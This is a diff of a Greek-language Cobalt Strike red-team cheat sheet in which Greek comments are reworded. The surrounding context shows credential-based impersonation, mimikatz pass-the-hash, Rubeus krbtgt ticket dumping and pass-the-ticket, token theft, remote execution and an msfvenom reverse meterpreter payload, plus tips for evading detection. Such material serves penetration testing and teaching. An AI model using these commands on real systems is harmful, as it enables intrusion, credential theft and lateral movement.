@@ -60,7 +60,7 @@ powershell &#x3C;just write powershell cmd here>
 
 # User impersonation
 ## Token generation with creds
-make_token [DOMAIN\user] [password] #Δημιουργήστε token για να προσποιηθείτε έναν χρήστη στο δίκτυο
+make_token [DOMAIN\user] [password] #Δημιουργία token για να προσποιηθείτε έναν χρήστη στο δίκτυο
 ls \\computer_name\c$ # Δοκιμάστε να χρησιμοποιήσετε το παραγόμενο token για να αποκτήσετε πρόσβαση στο C$ σε έναν υπολογιστή
 rev2self # Σταματήστε να χρησιμοποιείτε το token που δημιουργήθηκε με make_token
 ## Η χρήση του make_token δημιουργεί το γεγονός 4624: Ένας λογαριασμός συνδέθηκε επιτυχώς.  Αυτό το γεγονός είναι πολύ κοινό σε ένα Windows domain, αλλά μπορεί να περιοριστεί φιλτράροντας τον Τύπο Σύνδεσης.  Όπως αναφέρθηκε παραπάνω, χρησιμοποιεί το LOGON32_LOGON_NEW_CREDENTIALS που είναι τύπος 9.
@@ -79,7 +79,7 @@ rev2self # Σταματήστε να χρησιμοποιείτε το token α�
 
 ## Launch process with nwe credentials
 spawnas [domain\username] [password] [listener] #Κάντε το από έναν κατάλογο με δικαιώματα ανάγνωσης όπως: cd C:\
-## Όπως το make_token, αυτό θα δημιουργήσει το γεγονός Windows 4624: Ένας λογαριασμός συνδέθηκε επιτυχώς αλλά με τύπο σύνδεσης 2 (LOGON32_LOGON_INTERACTIVE).  Θα αναφέρει τον καλούντα χρήστη (TargetUserName) και τον προσωποποιημένο χρήστη (TargetOutboundUserName).
+## Όπως το make_token, αυτό θα δημιουργήσει το Windows event 4624: Ένας λογαριασμός συνδέθηκε επιτυχώς αλλά με τύπο σύνδεσης 2 (LOGON32_LOGON_INTERACTIVE).  Θα αναφέρει τον καλούντα χρήστη (TargetUserName) και τον προσωποποιημένο χρήστη (TargetOutboundUserName).
 
 ## Inject into process
 inject [pid] [x64|x86] [listener]
@@ -92,7 +92,7 @@ pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash through mimikatz
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Χωρίς /run, το mimikatz δημιουργεί ένα cmd.exe, αν τρέχετε ως χρήστης με Desktop, θα δει το shell (αν τρέχετε ως SYSTEM είστε εντάξει)
+## Χωρίς /run, το mimikatz δημιουργεί ένα cmd.exe, αν εκτελείστε ως χρήστης με Desktop, θα δει το shell (αν εκτελείστε ως SYSTEM είστε εντάξει)
 steal_token &#x3C;pid> #Κλέψτε το token από τη διαδικασία που δημιουργήθηκε από το mimikatz
 
 ## Pass the ticket
@@ -115,9 +115,9 @@ steal_token &#x3C;pid>
 execute-assembly C:\path\Rubeus.exe triage
 ### Dump interesting ticket by luid
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
-### Δημιουργήστε νέα συνεδρία σύνδεσης, σημειώστε το luid και το processid
+### Create new logon session, note luid and processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-### Εισάγετε το εισιτήριο στη δημιουργηθείσα συνεδρία σύνδεσης
+### Insert ticket in generate logon session
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
 ### Τέλος, κλέψτε το token από αυτή τη νέα διαδικασία
 steal_token &#x3C;pid>
@@ -134,7 +134,7 @@ jump [method] [target] [listener]
 
 remote-exec [method] [target] [command]
 ## Μέθοδοι:
-<strong>## psexec                          Απομακρυσμένη εκτέλεση μέσω του Service Control Manager
+<strong>## psexec                          Απομακρυσμένη εκτέλεση μέσω Service Control Manager
 </strong>## winrm                           Απομακρυσμένη εκτέλεση μέσω WinRM (PowerShell)
 ## wmi                             Απομακρυσμένη εκτέλεση μέσω WMI
 
@@ -158,7 +158,7 @@ beacon> spawn metasploit
 # Pass session to Metasploit - Through shellcode injection
 ## Στον host του metasploit
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
-## Εκτελέστε το msfvenom και προετοιμάστε τον listener multi/handler
+## Εκτελέστε το msfvenom και προετοιμάστε τον multi/handler listener
 
 ## Αντιγράψτε το bin αρχείο στον host του cobalt strike
 ps
@@ -200,7 +200,7 @@ pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
 Η τροποποίηση των ανιχνευμένων γραμμών μπορεί να δημιουργήσει ένα πρότυπο που δεν θα ανιχνευθεί.
 
-Μην ξεχάσετε να φορτώσετε το επιθετικό σενάριο `ResourceKit\resources.cna` για να υποδείξετε στο Cobalt Strike να χρησιμοποιήσει τους πόρους από τον δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.
+Μην ξεχάσετε να φορτώσετε το επιθετικό σενάριο `ResourceKit\resources.cna` για να υποδείξετε στο Cobalt Strike να χρησιμοποιήσει τους πόρους από το δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
